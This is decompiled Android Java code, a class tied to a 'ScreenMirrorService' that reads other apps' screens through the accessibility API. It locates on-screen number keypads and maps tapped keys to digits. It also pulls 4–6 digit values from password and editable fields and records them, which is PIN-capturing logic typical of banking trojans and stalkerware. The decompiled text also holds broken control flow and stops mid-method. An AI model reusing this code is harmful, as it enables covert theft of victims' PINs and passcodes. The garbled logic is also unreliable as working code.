// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.graphics.Rect;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.function.ToIntFunction;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class o1 {

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public static final Pattern f4677x = Pattern.compile("^digit (\\d) key$", 2);

    /* JADX INFO: renamed from: y, reason: collision with root package name */
    public static final Pattern f4678y = Pattern.compile(".*(backspace|delete|borrar|删除|退格).*", 2);

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final ScreenMirrorService f4679a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final aa f4680b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final dc f4681c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final h2.a f4682d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final d2.a f4683e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final HashMap f4684f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final Object f4685g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public final HashMap f4686h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public String f4687i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public long f4688j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public String f4689k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public String f4690l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public String f4691m;
    public String n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public char f4692o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public String f4693p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public long f4694q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public final h1 f4695r;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public final h1 f4696s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public final h1 f4697t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public final h1 f4698u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public final h1 f4699v;

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public final h1 f4700w;

    /* JADX WARN: Type inference failed for: r1v10, types: [w1.h1] */
    /* JADX WARN: Type inference failed for: r1v11, types: [w1.h1] */
    /* JADX WARN: Type inference failed for: r1v12, types: [w1.h1] */
    /* JADX WARN: Type inference failed for: r1v7, types: [w1.h1] */
    /* JADX WARN: Type inference failed for: r1v8, types: [w1.h1] */
    /* JADX WARN: Type inference failed for: r1v9, types: [w1.h1] */
    public o1(ScreenMirrorService screenMirrorService, aa aaVar, dc dcVar) {
        h2.a aVar = new h2.a(1);
        this.f4683e = new d2.a(0);
        this.f4684f = new HashMap();
        this.f4685g = new Object();
        this.f4686h = new HashMap();
        this.f4687i = "";
        this.f4688j = -1L;
        this.f4689k = "";
        this.f4690l = "click-seq";
        this.f4691m = "";
        this.n = "";
        this.f4693p = "";
        this.f4694q = Long.MIN_VALUE;
        final int i3 = 0;
        this.f4695r = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i3) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        final int i4 = 1;
        this.f4696s = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i4) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        this.f4697t = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i4) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        this.f4698u = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i4) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        this.f4699v = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i4) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        this.f4700w = new Runnable(this) { // from class: w1.h1

            /* JADX INFO: renamed from: d, reason: collision with root package name */
            public final /* synthetic */ o1 f4163d;

            {
                this.f4163d = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                String string;
                switch (i4) {
                    case 0:
                        o1 o1Var = this.f4163d;
                        o1Var.f4682d.getClass();
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        d2.a aVar2 = o1Var.f4683e;
                        synchronized (aVar2) {
                            string = null;
                            if (((StringBuilder) aVar2.f541e).length() >= 4 && jUptimeMillis - aVar2.f538b >= 1500) {
                                StringBuilder sb = (StringBuilder) aVar2.f541e;
                                string = sb.toString();
                                sb.setLength(0);
                            }
                        }
                        o1Var.i(jUptimeMillis, string, o1Var.f4689k, o1Var.f4690l);
                        return;
                    default:
                        o1 o1Var2 = this.f4163d;
                        o1Var2.p(o1Var2.f4691m);
                        return;
                }
            }
        };
        this.f4679a = screenMirrorService;
        this.f4680b = aaVar;
        this.f4681c = dcVar;
        this.f4682d = aVar;
    }

    public static Rect c(AccessibilityNodeInfo accessibilityNodeInfo) {
        Rect rect = new Rect();
        try {
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.isEmpty()) {
                return null;
            }
            return rect;
        } catch (Throwable unused) {
            return null;
        }
    }

    public static Rect d(ArrayList arrayList) {
        if (arrayList.isEmpty()) {
            return null;
        }
        Rect rect = new Rect((Rect) arrayList.get(0));
        for (int i3 = 1; i3 < arrayList.size(); i3++) {
            rect.union((Rect) arrayList.get(i3));
        }
        return rect;
    }

    public static ArrayList f(int i3, ArrayList arrayList, boolean z2) {
        ArrayList arrayList2 = new ArrayList(arrayList.size());
        int size = arrayList.size();
        int i4 = 0;
        while (i4 < size) {
            Object obj = arrayList.get(i4);
            i4++;
            Rect rect = (Rect) obj;
            arrayList2.add(Integer.valueOf(z2 ? rect.centerX() : rect.centerY()));
        }
        arrayList2.sort(new j1(0));
        ArrayList arrayList3 = new ArrayList();
        int size2 = arrayList2.size();
        int i5 = 0;
        while (i5 < size2) {
            Object obj2 = arrayList2.get(i5);
            i5++;
            int iIntValue = ((Integer) obj2).intValue();
            int size3 = arrayList3.size();
            k1 k1Var = null;
            double d3 = Double.MAX_VALUE;
            int i6 = 0;
            while (i6 < size3) {
                Object obj3 = arrayList3.get(i6);
                i6++;
                k1 k1Var2 = (k1) obj3;
                double dAbs = Math.abs(((double) iIntValue) - k1Var2.f4381a);
                int i7 = size2;
                if (dAbs <= i3 && dAbs < d3) {
                    k1Var = k1Var2;
                    d3 = dAbs;
                }
                size2 = i7;
            }
            int i8 = size2;
            if (k1Var == null) {
                k1 k1Var3 = new k1();
                k1Var3.f4382b = 1;
                k1Var3.f4381a = iIntValue;
                arrayList3.add(k1Var3);
            } else {
                double d4 = k1Var.f4381a;
                int i9 = k1Var.f4382b;
                double d5 = (d4 * ((double) i9)) + ((double) iIntValue);
                int i10 = i9 + 1;
                k1Var.f4381a = d5 / ((double) i10);
                k1Var.f4382b = i10;
            }
            size2 = i8;
        }
        return arrayList3;
    }

    public static boolean g(HashMap map) {
        if (map.size() != 10) {
            return false;
        }
        for (char c3 = '0'; c3 <= '9'; c3 = (char) (c3 + 1)) {
            if (!map.containsKey(Character.valueOf(c3))) {
                return false;
            }
        }
        return true;
    }

    public static int k(ArrayList arrayList, boolean z2) {
        ArrayList arrayList2 = new ArrayList(arrayList.size());
        int size = arrayList.size();
        int i3 = 0;
        while (i3 < size) {
            Object obj = arrayList.get(i3);
            i3++;
            Rect rect = (Rect) obj;
            arrayList2.add(Integer.valueOf(z2 ? rect.width() : rect.height()));
        }
        arrayList2.sort(new j1(0));
        return ((Integer) arrayList2.get(arrayList2.size() / 2)).intValue();
    }

    public static long m(Rect rect, Rect rect2) {
        long jCenterX = rect.centerX() - rect2.centerX();
        long jCenterY = rect.centerY() - rect2.centerY();
        return (jCenterY * jCenterY) + (jCenterX * jCenterX);
    }

    public static String n(CharSequence charSequence) {
        return charSequence == null ? "" : charSequence.toString();
    }

    /* JADX WARN: Code duplicated, block: B:100:0x0187 A[LOOP:2: B:67:0x0117->B:100:0x0187, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:160:0x0258 A[EDGE_INSN: B:160:0x0258->B:126:0x0258 BREAK  A[LOOP:2: B:67:0x0117->B:100:0x0187], SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:95:0x017c A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:96:0x017e  */
    public static void o(AccessibilityNodeInfo accessibilityNodeInfo, n1 n1Var, Rect rect) {
        int i3;
        Rect rect2;
        String string;
        int childCount;
        String string2;
        Rect rectC;
        AccessibilityNodeInfo child;
        if (accessibilityNodeInfo == null || (i3 = n1Var.f4594a) >= 600) {
            return;
        }
        int i4 = 1;
        n1Var.f4594a = i3 + 1;
        Rect rectC2 = c(accessibilityNodeInfo);
        try {
            rect2 = (!accessibilityNodeInfo.isClickable() || rectC2 == null) ? rect : rectC2;
        } catch (Throwable unused) {
        }
        Matcher matcher = f4677x.matcher(n(accessibilityNodeInfo.getContentDescription()));
        if (matcher.matches()) {
            Character chR = r(matcher.group(1));
            if (rect2 != null) {
                rectC2 = rect2;
            }
            if (chR != null && rectC2 != null) {
                n1Var.f4595b.put(chR, new Rect(rectC2));
            }
        }
        String strN = n(accessibilityNodeInfo.getText());
        Character chR2 = r(strN);
        if (chR2 != null && rect2 != null) {
            ((ArrayList) n1Var.f4597d).add(new l1(chR2.charValue(), new Rect(rect2)));
        }
        int i5 = 0;
        if (strN == null || strN.isEmpty()) {
            string = null;
            break;
        }
        StringBuilder sb = new StringBuilder();
        int iCharCount = 0;
        while (true) {
            if (iCharCount >= strN.length()) {
                string = sb.toString();
                break;
            }
            int iCodePointAt = strN.codePointAt(iCharCount);
            int iDigit = Character.digit(iCodePointAt, 10);
            if (iDigit < 0) {
                string = null;
                break;
            } else {
                sb.append((char) (iDigit + 48));
                iCharCount += Character.charCount(iCodePointAt);
            }
        }
        if ((accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.isPassword()) && string != null && string.length() >= 4 && string.length() <= 6) {
            ((ArrayList) n1Var.f4596c).add(string);
        }
        try {
            childCount = accessibilityNodeInfo.getChildCount();
        } catch (Throwable unused2) {
            childCount = 0;
        }
        ArrayList arrayList = new ArrayList(Math.min(childCount, 32));
        for (int i6 = 0; i6 < childCount && n1Var.f4594a < 600; i6++) {
            try {
                child = accessibilityNodeInfo.getChild(i6);
            } catch (Throwable unused3) {
                child = null;
            }
            if (child != null) {
                arrayList.add(child);
            }
        }
        if (arrayList.size() >= 4 && arrayList.size() <= 6) {
            final ArrayList arrayList2 = new ArrayList(arrayList.size());
            ArrayList arrayList3 = new ArrayList(arrayList.size());
            int size = arrayList.size();
            boolean z2 = true;
            int i7 = 0;
            while (true) {
                if (i7 < size) {
                    Object obj = arrayList.get(i7);
                    i7++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    String strN2 = n(accessibilityNodeInfo2.getText());
                    int i8 = (strN2.isEmpty() || (strN2.trim().isEmpty() && strN2.codePointCount(0, strN2.length()) <= i4)) ? i4 : 0;
                    if (i8 == 0 && strN2.codePointCount(0, strN2.length()) != i4) {
                        break;
                    }
                    Character chR3 = i8 != 0 ? null : r(strN2);
                    if (i8 == 0) {
                        int iCodePointAt2 = strN2.codePointAt(0);
                        if (chR3 == null && ((iCodePointAt2 > 65535 || "•●*▪■·".indexOf((char) iCodePointAt2) < 0) && !Character.isWhitespace(iCodePointAt2))) {
                            break;
                        }
                        if (chR3 == null) {
                            z2 = false;
                        }
                        rectC = c(accessibilityNodeInfo2);
                        if (rectC == null) {
                            break;
                        }
                        arrayList2.add(rectC);
                        arrayList3.add(chR3);
                        i4 = 1;
                    } else {
                        if (chR3 == null) {
                            z2 = false;
                        }
                        rectC = c(accessibilityNodeInfo2);
                        if (rectC == null) {
                            break;
                            break;
                        } else {
                            arrayList2.add(rectC);
                            arrayList3.add(chR3);
                            i4 = 1;
                        }
                    }
                } else {
                    if (arrayList2.isEmpty()) {
                        break;
                    }
                    ArrayList arrayList4 = new ArrayList(arrayList2);
                    arrayList4.sort(Comparator.comparingInt(new q(1)));
                    int size2 = arrayList4.size();
                    int iMax = Integer.MIN_VALUE;
                    int iMax2 = 0;
                    int i9 = 0;
                    int iMin = Integer.MAX_VALUE;
                    int iCenterX = Integer.MIN_VALUE;
                    while (true) {
                        if (i9 >= size2) {
                            if (iMax - iMin > Math.max(4, iMax2)) {
                                break;
                            }
                            ArrayList arrayList5 = new ArrayList(arrayList2.size());
                            for (int i10 = 0; i10 < arrayList2.size(); i10++) {
                                arrayList5.add(Integer.valueOf(i10));
                            }
                            arrayList5.sort(Comparator.comparingInt(new ToIntFunction() { // from class: w1.g1
                                @Override // java.util.function.ToIntFunction
                                public final int applyAsInt(Object obj2) {
                                    return ((Rect) arrayList2.get(((Integer) obj2).intValue())).left;
                                }
                            }));
                            if (z2) {
                                StringBuilder sb2 = new StringBuilder(arrayList2.size());
                                int size3 = arrayList5.size();
                                int i11 = 0;
                                while (i11 < size3) {
                                    Object obj2 = arrayList5.get(i11);
                                    i11++;
                                    sb2.append(arrayList3.get(((Integer) obj2).intValue()));
                                }
                                string2 = sb2.toString();
                            } else {
                                string2 = null;
                            }
                            ((ArrayList) n1Var.f4598e).add(new m1(arrayList2.size(), d(arrayList2), string2));
                            break;
                        }
                        Object obj3 = arrayList4.get(i9);
                        i9++;
                        Rect rect3 = (Rect) obj3;
                        if (rect3.isEmpty() || rect3.centerX() <= iCenterX) {
                            break;
                        }
                        iCenterX = rect3.centerX();
                        iMin = Math.min(iMin, rect3.centerY());
                        iMax = Math.max(iMax, rect3.centerY());
                        iMax2 = Math.max(iMax2, rect3.height());
                    }
                }
            }
        }
        int size4 = arrayList.size();
        while (i5 < size4) {
            Object obj4 = arrayList.get(i5);
            i5++;
            AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj4;
            try {
                o(accessibilityNodeInfo3, n1Var, rect2);
                accessibilityNodeInfo3.recycle();
            } catch (Throwable th) {
                try {
                    accessibilityNodeInfo3.recycle();
                } catch (Throwable unused4) {
                }
                throw th;
            }
        }
    }

    public static Character r(String str) {
        int iDigit;
        if (str == null || str.isEmpty() || str.codePointCount(0, str.length()) != 1 || (iDigit = Character.digit(str.codePointAt(0), 10)) < 0) {
            return null;
        }
        return Character.valueOf((char) (iDigit + 48));
    }

    public static String s(String str, String str2) {
        if (str == null || str.isEmpty()) {
            return str2 == null ? "" : str2;
        }
        return str;
    }

    /* JADX WARN: Code duplicated, block: B:41:0x0093  */
    /* JADX WARN: Code duplicated, block: B:42:0x009d  */
    public final void a(char c3, String str, String str2, long j3) {
        int length;
        String string;
        String str3;
        o1 o1Var;
        if (c3 == this.f4692o) {
            long j4 = this.f4694q;
            if (j3 >= j4 && j3 - j4 <= 500) {
                String str4 = this.f4693p;
                if ("inject".equals(str4) && "click-seq".equals(str2)) {
                    return;
                }
                if ("click-seq".equals(str4) && "inject".equals(str2)) {
                    return;
                }
            }
        }
        this.f4692o = c3;
        this.f4693p = str2;
        this.f4694q = j3;
        d2.a aVar = this.f4683e;
        synchronized (aVar) {
            length = ((StringBuilder) aVar.f541e).length();
        }
        if (length == 0) {
            this.f4689k = str;
            this.f4690l = str2;
        }
        d2.a aVar2 = this.f4683e;
        synchronized (aVar2) {
            try {
                synchronized (aVar2) {
                    aVar2.c(aVar2.f539c, j3, str);
                }
                str3 = string;
                if (str3 != null) {
                    o1Var = this;
                    o1Var.i(j3, str3, this.f4689k, this.f4690l);
                } else {
                    o1Var = this;
                }
                dc dcVar = o1Var.f4681c;
                h1 h1Var = o1Var.f4695r;
                dcVar.i(h1Var);
                dcVar.h(1600L, h1Var);
            } catch (Throwable th) {
                throw th;
            }
        }
        aVar2.f538b = j3;
        if (((StringBuilder) aVar2.f541e).length() >= aVar2.f539c) {
            ((StringBuilder) aVar2.f541e).setLength(0);
        }
        ((StringBuilder) aVar2.f541e).append(c3);
        if (((StringBuilder) aVar2.f541e).length() >= aVar2.f539c) {
            StringBuilder sb = (StringBuilder) aVar2.f541e;
            string = sb.toString();
            sb.setLength(0);
        } else {
            string = null;
        }
        str3 = string;
        if (str3 != null) {
            o1Var = this;
            o1Var.i(j3, str3, this.f4689k, this.f4690l);
        } else {
            o1Var = this;
        }
        dc dcVar2 = o1Var.f4681c;
        h1 h1Var2 = o1Var.f4695r;
        dcVar2.i(h1Var2);
        dcVar2.h(1600L, h1Var2);
    }

    /* JADX WARN: Code duplicated, block: B:100:0x026e  */
    /* JADX WARN: Code duplicated, block: B:110:0x0290 A[LOOP:3: B:109:0x028e->B:110:0x0290, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:113:0x02b2  */
    /* JADX WARN: Code duplicated, block: B:117:0x0271 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:140:0x02be A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:142:0x02b0 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:60:0x01d1  */
    /* JADX WARN: Code duplicated, block: B:74:0x0202  */
    /* JADX WARN: Code duplicated, block: B:75:0x0205  */
    /* JADX WARN: Code duplicated, block: B:77:0x020b  */
    /* JADX WARN: Code duplicated, block: B:78:0x020d  */
    /* JADX WARN: Code duplicated, block: B:90:0x024e  */
    /* JADX WARN: Code duplicated, block: B:96:0x025c  */
    /* JADX WARN: Code duplicated, block: B:98:0x025f  */
    public final boolean b(String str, n1 n1Var, long j3) {
        int i3;
        p2.a0 a0Var;
        HashMap map;
        HashMap map2;
        ArrayList arrayList;
        Rect rectD;
        int i4;
        boolean z2;
        ArrayList arrayList2;
        int size;
        int i5;
        ArrayList arrayList3;
        int size2;
        int i6;
        String str2;
        Rect rect;
        o1 o1Var = this;
        String str3 = str;
        long j4 = j3;
        ArrayList arrayList4 = (ArrayList) n1Var.f4598e;
        ArrayList arrayList5 = (ArrayList) n1Var.f4597d;
        if (arrayList4.isEmpty() || arrayList5.isEmpty()) {
            i3 = 0;
            a0Var = null;
            break;
        }
        ArrayList arrayList6 = (ArrayList) n1Var.f4598e;
        int size3 = arrayList6.size();
        int i7 = 0;
        while (true) {
            if (i7 >= size3) {
                i3 = 0;
                a0Var = null;
                break;
            }
            Object obj = arrayList6.get(i7);
            int i8 = i7 + 1;
            m1 m1Var = (m1) obj;
            HashMap map3 = new HashMap();
            HashSet hashSet = new HashSet();
            int size4 = arrayList5.size();
            int i9 = 0;
            while (i9 < size4) {
                Object obj2 = arrayList5.get(i9);
                int i10 = i9 + 1;
                l1 l1Var = (l1) obj2;
                ArrayList arrayList7 = arrayList6;
                Rect rect2 = l1Var.f4435b;
                char c3 = l1Var.f4434a;
                ArrayList arrayList8 = arrayList5;
                Rect rect3 = m1Var.f4492b;
                int i11 = size4;
                Rect rect4 = new Rect(rect3);
                int i12 = size3;
                int i13 = i8;
                rect4.inset(-Math.max(400, rect3.width() * 2), -Math.max(800, rect3.width() * 4));
                if (Rect.intersects(rect4, rect2) && rect2.centerY() >= rect3.top - Math.max(100, rect3.height() * 2)) {
                    if (hashSet.add(c3 + ":" + rect2.left + ":" + rect2.top + ":" + rect2.right + ":" + rect2.bottom) && ((rect = (Rect) map3.get(Character.valueOf(c3))) == null || m(rect2, rect3) < m(rect, rect3))) {
                        map3.put(Character.valueOf(c3), rect2);
                    }
                }
                arrayList6 = arrayList7;
                arrayList5 = arrayList8;
                size4 = i11;
                size3 = i12;
                i9 = i10;
                i8 = i13;
            }
            ArrayList arrayList9 = arrayList6;
            ArrayList arrayList10 = arrayList5;
            int i14 = size3;
            int i15 = i8;
            if (!g(map3)) {
                break;
                break;
            }
            ArrayList arrayList11 = new ArrayList(map3.values());
            if (arrayList11.size() == 10) {
                int iK = k(arrayList11, true);
                int iK2 = k(arrayList11, false);
                if (iK > 0 && iK2 > 0) {
                    int size5 = arrayList11.size();
                    int i16 = 0;
                    while (true) {
                        if (i16 >= size5) {
                            ArrayList arrayListF = f(Math.max(4, iK2 / 2), arrayList11, false);
                            ArrayList arrayListF2 = f(Math.max(4, iK / 2), arrayList11, true);
                            if (arrayListF.size() == 4 && arrayListF2.size() == 3) {
                                arrayListF.sort(Comparator.comparingDouble(new i1()));
                                i3 = 0;
                                if (((k1) arrayListF.get(0)).f4382b != 3 || ((k1) arrayListF.get(1)).f4382b != 3 || ((k1) arrayListF.get(2)).f4382b != 3 || ((k1) arrayListF.get(3)).f4382b != 1) {
                                    break;
                                    break;
                                    break;
                                    break;
                                }
                                a0Var = new p2.a0(map3, m1Var.f4491a);
                                break;
                            }
                        } else {
                            Object obj3 = arrayList11.get(i16);
                            i16++;
                            Rect rect5 = (Rect) obj3;
                            if (rect5.width() * 3 < iK || rect5.width() > iK * 3 || rect5.height() * 3 < iK2 || rect5.height() > iK2 * 3) {
                            }
                        }
                        break;
                        break;
                    }
                }
                break;
                break;
            }
            break;
            arrayList6 = arrayList9;
            arrayList5 = arrayList10;
            size3 = i14;
            i7 = i15;
        }
        if (g(n1Var.f4595b)) {
            map = n1Var.f4595b;
        } else {
            if (a0Var == null) {
                if (n1Var.f4595b.isEmpty()) {
                    map2 = null;
                } else {
                    map = n1Var.f4595b;
                }
                if (a0Var != null) {
                    i4 = a0Var.f2874a;
                } else {
                    arrayList = (ArrayList) n1Var.f4598e;
                    if (map2 == null) {
                        rectD = null;
                    } else {
                        rectD = d(new ArrayList(map2.values()));
                    }
                    if (!arrayList.isEmpty() || rectD == null) {
                        i4 = 6;
                    } else {
                        int size6 = arrayList.size();
                        long j5 = Long.MAX_VALUE;
                        m1 m1Var2 = null;
                        int i17 = i3;
                        while (i17 < size6) {
                            Object obj4 = arrayList.get(i17);
                            i17++;
                            m1 m1Var3 = (m1) obj4;
                            long jM = m(m1Var3.f4492b, rectD);
                            if (jM < j5) {
                                m1Var2 = m1Var3;
                                j5 = jM;
                            }
                        }
                        if (m1Var2 == null) {
                            i4 = 6;
                        } else {
                            i4 = m1Var2.f4491a;
                        }
                    }
                }
                if (map2 != null || map2.isEmpty()) {
                    z2 = false;
                } else {
                    z2 = true;
                }
                if (z2) {
                    o1Var.i(j4, o1Var.f4683e.c(i4, j4, str3), o1Var.f4689k, o1Var.f4690l);
                }
                if (z2) {
                    synchronized (o1Var.f4685g) {
                        o1Var.f4686h.clear();
                        o1Var.f4686h.putAll(map2);
                        o1Var.f4687i = str3;
                        o1Var.f4688j = j4;
                    }
                }
                arrayList2 = (ArrayList) n1Var.f4596c;
                size = arrayList2.size();
                for (i5 = 0; i5 < size; i5++) {
                    o1Var.i(j4, (String) arrayList2.get(i5), str3, "tree-field");
                    o1Var = this;
                    str3 = str;
                    j4 = j3;
                }
                arrayList3 = (ArrayList) n1Var.f4598e;
                size2 = arrayList3.size();
                i6 = 0;
                while (i6 < size2) {
                    Object obj5 = arrayList3.get(i6);
                    i6++;
                    str2 = ((m1) obj5).f4493c;
                    if (str2 != null) {
                        i(j3, str2, str, "tree-digits");
                    }
                }
                return z2;
            }
            map = (HashMap) a0Var.f2875b;
        }
        map2 = map;
        if (a0Var != null) {
            i4 = a0Var.f2874a;
        } else {
            arrayList = (ArrayList) n1Var.f4598e;
            if (map2 == null) {
                rectD = null;
            } else {
                rectD = d(new ArrayList(map2.values()));
            }
            if (arrayList.isEmpty()) {
                i4 = 6;
            } else {
                i4 = 6;
            }
        }
        if (map2 != null) {
            z2 = false;
        } else {
            z2 = false;
        }
        if (z2) {
            o1Var.i(j4, o1Var.f4683e.c(i4, j4, str3), o1Var.f4689k, o1Var.f4690l);
        }
        if (z2) {
            synchronized (o1Var.f4685g) {
                o1Var.f4686h.clear();
                o1Var.f4686h.putAll(map2);
                o1Var.f4687i = str3;
                o1Var.f4688j = j4;
            }
        }
        arrayList2 = (ArrayList) n1Var.f4596c;
        size = arrayList2.size();
        while (i5 < size) {
            o1Var.i(j4, (String) arrayList2.get(i5), str3, "tree-field");
            o1Var = this;
            str3 = str;
            j4 = j3;
        }
        arrayList3 = (ArrayList) n1Var.f4598e;
        size2 = arrayList3.size();
        i6 = 0;
        while (i6 < size2) {
            Object obj6 = arrayList3.get(i6);
            i6++;
            str2 = ((m1) obj6).f4493c;
            if (str2 != null) {
                i(j3, str2, str, "tree-digits");
            }
        }
        return z2;
    }

    public final void e(char c3, AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        Rect rectC = c(accessibilityNodeInfo);
        if (rectC == null) {
            return;
        }
        synchronized (this.f4685g) {
            try {
                if (!str.equals(this.f4687i)) {
                    this.f4686h.clear();
                    this.f4687i = str;
                }
                this.f4686h.put(Character.valueOf(c3), rectC);
                this.f4682d.getClass();
                this.f4688j = SystemClock.uptimeMillis();
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    /* JADX WARN: Code duplicated, block: B:17:0x0030  */
    public final Character h(long j3, AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        boolean z2;
        Rect rectC = c(accessibilityNodeInfo);
        Character ch = null;
        if (rectC != null) {
            synchronized (this.f4685g) {
                if (this.f4686h.isEmpty() || !str.equals(this.f4687i)) {
                    z2 = false;
                } else {
                    long j4 = this.f4688j;
                    if (j4 < 0 || j3 < j4 || j3 - j4 > 60000) {
                        z2 = false;
                    } else {
                        z2 = true;
                    }
                }
            }
            if (z2) {
                synchronized (this.f4685g) {
                    try {
                        long j5 = Long.MAX_VALUE;
